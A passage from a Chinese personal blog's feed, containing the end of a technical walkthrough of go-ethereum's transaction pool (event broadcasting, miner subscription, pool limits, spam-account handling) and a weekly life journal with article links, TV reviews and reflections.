class="keyword">if</span> err := pool.journal.rotate(pool.local()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Failed to rotate local tx journal&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">pool.mu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="新交易信号"><a href="#新交易信号" class="headerlink" title="新交易信号"></a>新交易信号</h2><p>文章开头，有提到<strong>进入交易池的交易将被广播到网络</strong>中。这<strong>是依赖于交易池支持外部订阅新交易事件信号</strong>。任何<strong>订阅此事件的子模块</strong>，在交易池出现新的可执行交易时，均可实时接受到此事件通知，并获得新交易信息。</p><blockquote><p>需要注意的是并非所有进入交易池的交易均被通知外部，而是只有交易从非可执行状态变成可执行状态后才会发送信号。</p></blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core/tx_pool.go:705</span></span><br><span class="line"><span class="keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;types.Transactions&#123;tx&#125;&#125;)</span><br><span class="line"><span class="comment">//core/tx_pool.go:1022</span></span><br><span class="line"><span class="keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;promoted&#125;)</span><br></pre></td></tr></table></figure><p>在交易池中，有两处地方才会执行发送信号。<br>一是<strong>交易时用于替换已经存在的可执行交易</strong>时。<br>二是有<strong>新的一批交易从非可执行状态提升到可执行状态后</strong>。<br>外部只需要订阅 SubscribeNewTxsEvent(ch chan&lt;- NewTxsEvent)新可执行交易事件，则可实时接受交易。<br>在 geth 中网络层将<strong>订阅交易事件</strong>，以便实时广播。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//eth/handler.go:213</span></span><br><span class="line">pm.txsCh = <span class="built_in">make</span>(<span class="keyword">chan</span> core.NewTxsEvent, txChanSize)</span><br><span class="line">pm.txsSub = pm.txpool.SubscribeNewTxsEvent(pm.txsCh)</span><br><span class="line"><span class="comment">//eth/handler.go:781</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pm *ProtocolManager)</span> <span class="title">txBroadcastLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      <span class="keyword">select</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> event := &lt;-pm.txsCh:</span><br><span class="line">         pm.BroadcastTxs(event.Txs)</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外是矿工实时订阅交易，以便将交易打包到区块中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//miner/worker.go:207</span></span><br><span class="line">worker.txsSub = eth.TxPool().SubscribeNewTxsEvent(worker.txsCh)</span><br><span class="line"><span class="comment">//miner/worker.go:462</span></span><br><span class="line">txs := <span class="built_in">make</span>(<span class="keyword">map</span>[common.Address]types.Transactions)</span><br><span class="line"><span class="keyword">for</span> _, tx := <span class="keyword">range</span> ev.Txs &#123;</span><br><span class="line">acc, _ := types.Sender(w.current.signer, tx)</span><br><span class="line">   txs[acc] = <span class="built_in">append</span>(txs[acc], tx)</span><br><span class="line">&#125;</span><br><span class="line">txset := types.NewTransactionsByPriceAndNonce(w.current.signer, txs)</span><br><span class="line">w.commitTransactions(txset, coinbase, <span class="literal">nil</span>)</span><br></pre></td></tr></table></figure><h1 id="清理交易池"><a href="#清理交易池" class="headerlink" title="清理交易池"></a>清理交易池</h1><p>交易池是完全存在内存中的，因此有大小限制，每当超过一定的阈值就需要清理。实际实现时，pending 的缓冲区容量默认为 4096，queue 的缓冲区容量默认为 1024。<br>清理的时机是交易池满的时候，清理的原则是价格较低的最先清理</p><blockquote><p>但是本项目没有设计要清理交易池</p></blockquote><h1 id="惩罚恶意账号"><a href="#惩罚恶意账号" class="headerlink" title="惩罚恶意账号"></a>惩罚恶意账号</h1><p>这也是 txpool 很重要的一个属性，可以防止恶意账户以发起大量垃圾交易。防止恶意用户造成：</p><ol><li>占用 txpool 空间</li><li>浪费节点大量内存和 CPU</li><li>降低打包性能</li></ol><p>** 只有当交易的总数量超过缓冲区大小时，txpool 才会认为有恶意账户发起大量交易。**pending 和 queued 缓冲区大小不同，但处理策略类似：</p><ol><li>pending 的缓冲区容量是 4096，当 pending 的交易数量多于此时，就会运行检查，每个账号的交易数量是否多于 16，把这些账号搜集出来，进行循环依次清理，什么意思呢？就是每轮只删除（移动到 queued）这些账号的每个账号 1 条交易，然后看数量是否降下来了，不满足再进行下一轮，直到满足。</li><li>queued 的缓冲区容量是 1024，超过之后清理策略和 pending 差不多，但这里可是真删除了。</li></ol><p>该部分功能未抽象成单独的函数，而是在 promoteExecutables()中，就是在每次把 queued 交易转移到 pending 后执行的。<br><strong>本地交易的特权</strong>，txpool 虽然对交易有诸多限制，但如果交易是本节点的账号发起的，以上数量限制等都对他无效。所以，如果你用本节点账号不停的发送交易，并不会被认为是攻击者</p><h1 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h1><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li></ol><p>所有与交易请求相关的参数被赋值到一个结构体中，然后进行序列化转变为可存储和传输的形式，最后生成交易并进行签名</p><ol start="2"><li>产生的交易如果不能被及时处理，是如何进入交易池的？</li></ol><p>最终是调用一个 add 函数，添加到了一个队列里</p><ol start="3"><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别？</li></ol><p>有区别，底层都是调用 add 函数</p><ol start="4"><li>交易池的基本数据结构是怎么样的（优先队列？）</li></ol><p>交易池是一个结构体，核心是 pending 和 queue 两个 map，map 的键是一个地址，值是一个交易链表形成的队列</p><ol start="5"><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）</li></ol><p>本地优先级大于远程交易</p><p>我们可以理解为区块链底层利用交易池对并发产生的请求做了<strong>异步化</strong>，<strong>交易产生的时刻</strong>和<strong>交易被打包的时刻</strong>是<strong>随机</strong>的。</p><blockquote><p>在实现 TXpool 的时候为了保证数据的一致性会使用大量的锁</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;既然要从头搭建一个区块链网络，交易池是绕不开的一个核心底层。对于它，以下几个问题是需要解决的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；&lt;/li&gt;
&lt;li&gt;产生的交易如果不能被及时处理，是如何进入交易池的；&lt;/li&gt;
&lt;li&gt;本地产生的交易和从网络中接收到的交易进入交易池是否有区别；&lt;/li&gt;
&lt;li&gt;交易池的基本数据结构是怎么样的（优先队列？）&lt;/li&gt;
&lt;li&gt;从交易池中提取交易进行打包时顺序是怎么样的（调度算法）&lt;blockquote&gt;
&lt;p&gt;网络中很多文章提到内存池，指的就是是 txpool&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Life-Weekly-April-12-to-18</title>
    <link href="https://www.blog.hackerjerry.top/2021/04/15/Life-Weekly-April-12-to-18_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/04/15/Life-Weekly-April-12-to-18_new/</id>
    <published>2021-04-15T11:14:09.000Z</published>
    <updated>2021-06-21T06:42:44.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>日本宣布将把福岛核废水排放入海，还恬不知耻的推出了一个“氚”的吉祥物。</li><li>中科大夏令营开始接收报名。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>无聊的时候（吃完饭）给自己测了一下十六型人格，结果是“守卫者 ISFJ-A”，看了一下这个结果其实是比较准确的。</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-1.png#clientId=ud3d92086-9aed-4&from=paste&height=341&id=ue2cb8370&margin=%5Bobject%20Object%5D&originHeight=804&originWidth=890&originalType=binary&size=46588&status=done&style=none&taskId=ud08b7ea8-50e0-4be0-846f-ac42bda13b9&width=377"><br>根据报告，守卫者人格在群体中所占比重最大，为 13%，不过我记得之前也做过这个测试，但是忘记结果了，我记得自己截了图，但是怎么也找不到，也不知道发到哪个平台了。<br>不过它描述的和我的人格真的非常像，摘抄一点：</p><blockquote><p><em>“守卫者”是真正的利他主义者，非常善良，对相信的人和事物慷慨而富有激情。</em></p></blockquote><p>这种人格类型的人（尤其是性格不安定的那一部分）经常<strong>一丝不苟到完美主义</strong>的程度，虽然他们<strong>有拖延的习惯</strong>，但他们总能<strong>可靠地按时完成工作</strong>。 守卫者人格类型的人重视自己的责任，时刻<strong>尽最大努力超出预期</strong>地让别人满意，无论在家庭还是工作中。<br><strong>天生喜欢社交</strong>是内向者身上少见的特点，“守卫者”们不会把出色的记忆力用在数据和琐事上，而是<strong>记住人和他们生活中的细节</strong>。 他们最<strong>擅长赠送礼物</strong>，他们<strong>天生富有想象力</strong>且<strong>感情细腻</strong>，他们的礼物可以送到接收者的心坎里。 对于被“守卫者”们当作朋友的同事们来说是这样，而在家庭里守卫者们会<strong>尽情表达爱意</strong>。<br><strong>弱点：</strong></p><ol><li>谦卑和害羞</li><li>压抑他们的感情</li><li>他们强烈的责任感和完美主义，加上这种对情感冲突的厌恶，造成了一种情况，即捍卫者太容易超载自己</li><li>太利他主义了，他们的麻烦却在无人协助的情况下增加。</li></ol><p>恋爱：</p><ol><li>守卫者花费大量时间和精力寻找让伴侣保持关系满意的方法。</li><li>作为回报，他们要求的就是承诺、爱，也许最重要的是欣赏。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><ol><li><a href="https://mp.weixin.qq.com/s/aj6LKXdAekoFCoSrpEwbAQ">攻破 GitHub 私有页面</a></li></ol><p>利用一个前缀绕过进行 XSS，利用缓存投毒进行认证流的持久化破坏。</p><ol start="2"><li><a href="https://mp.weixin.qq.com/s/k1ZRhTmNMgfaLCqniBmuNA">一篇有参考意义的产品 PPT 制作</a></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-2.png#clientId=u49d79466-a36b-4&from=paste&height=239&id=uebef2f08&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=852&originalType=binary&size=426622&status=done&style=none&taskId=ue23c0b44-6f1e-4c86-90c5-b20e1e6bff1&width=426"></p><ol start="3"><li><a href="https://mp.weixin.qq.com/s/__-d28S1X6CfpgiB3TwrTw">一位博士学长在大厂做安全算法工程师的感悟</a></li><li><a href="https://mp.weixin.qq.com/s/wDMcm4Q_waE3twkI-oajYg">基于机器学习的 Web 应用入侵威胁检测</a></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-3.png#clientId=u49d79466-a36b-4&from=paste&height=427&id=u7c7b4016&margin=%5Bobject%20Object%5D&originHeight=854&originWidth=338&originalType=binary&size=44182&status=done&style=none&taskId=u3fa9a8b8-057c-4d41-9333-36f34a4d393&width=169"></p><ol start="5"><li><a href="https://mp.weixin.qq.com/s/fqYbyKKAXCrR8ooE_jNFdA">一篇对于处理多文字的 PPT 范例</a></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-4.png#clientId=u49d79466-a36b-4&from=paste&height=401&id=uaedf9eeb&margin=%5Bobject%20Object%5D&originHeight=479&originWidth=851&originalType=binary&size=550925&status=done&style=none&taskId=ueb2143a6-5ef6-475a-aaf5-e9d206c1886&width=712.5"></p><ol start="6"><li><a href="https://mp.weixin.qq.com/s/elKxcNiwW14ceJOWiek2Ww">一篇关于毛玻璃效果的 PPT</a></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-5.png#clientId=u49d79466-a36b-4&from=paste&height=242&id=ub988f9f1&margin=%5Bobject%20Object%5D&originHeight=483&originWidth=862&originalType=binary&size=179871&status=done&style=none&taskId=u45a7c337-9928-4762-93a2-20bb7020f3b&width=431"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-6.png#clientId=u49d79466-a36b-4&from=paste&height=241&id=u603599ae&margin=%5Bobject%20Object%5D&originHeight=482&originWidth=848&originalType=binary&size=311473&status=done&style=none&taskId=uf73bcf00-d57c-4f2a-9c25-5d3b17036a9&width=424"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-7.png#clientId=u49d79466-a36b-4&from=paste&height=212&id=u907476e8&margin=%5Bobject%20Object%5D&originHeight=424&originWidth=854&originalType=binary&size=507600&status=done&style=none&taskId=u4abc5901-834f-464a-9dcd-5c065781745&width=427"></p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>《人潮汹涌》</li></ol><p>刘德华和肖央出演的一部本土改编剧，情节和原著有了一些变动，也很有趣。不过戏剧性冲突比韩国的原片还是要差一点，那个曾九蓉更是看的我云里雾里的，没看懂她存在的意义。笑点是比不上原著的，毕竟刘德华太帅了，很难表现出原著中“丑杀手”的一些搞笑的地方。 2.《 伍六七》第七集<br>伍六七终于到玄武国了，但是这都第七集了！！！一共就十集看个寂寞，估计这一季他连掌门的影子都见不到，还又挖了一堆坑，又是可乐，又是悬赏令，又是陈年旧账，何导可以的啊！！</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>踏实一点，不要着急，你想要的岁月都会给你。</li><li>寂寞会发慌，孤独则是饱满的。–蒋勋</li><li>人间忽晚，山河已秋。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>面试的技巧–见 flomo</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>从朋友圈看到的：如果有人一开始就对你表示出超乎寻常的喜爱，那么他也一定会在某天返给你极其的恨意。他心里曾经爱慕的和现在痛恨的，都和你没有关系，那只是他的想象。很有道理，值得反复思考和践行。</li><li>毛姆的《巨匠与杰作》中有这样一段话：<strong>不对别人期待太多</strong>，从一开始就应该认识到，每个人的主要兴趣都是他自身；无论在哪方面，付出才有回报，不管是地位、财富、荣誉、爱情，皆为如此。而且所谓智慧，很大程度上是，<strong>对某个事物的付出不要超出其真正价值</strong>。</li></ol><p>由于平时（白天）交流较少，经常性出现情感溢出的现象，即对特定的人付出超过其身份的感情，但依旧很难表现出来，就这样憋在心里，造成不必要的情绪波动。需要改正。</p><ol start="3"><li>“你的心意过头了，反而会让人为难。”敲不开的门，一直敲是不礼貌的。感情中尤为如此，本就是你情我愿，遇见了，感谢，错过了，坦然。毕竟离开是常态，彼此喜欢是上天恩赐。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;日本宣布将把福岛核废水排放入海，还恬不知耻的推出了一个“氚”的吉祥物。&lt;/li&gt;
&lt;li&gt;中科大夏令营开始接收报名。&lt;/li&gt;
</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/tags/%E5%91%A8%E6%8A%A5/"/>
    
  </entry>
  
</feed>
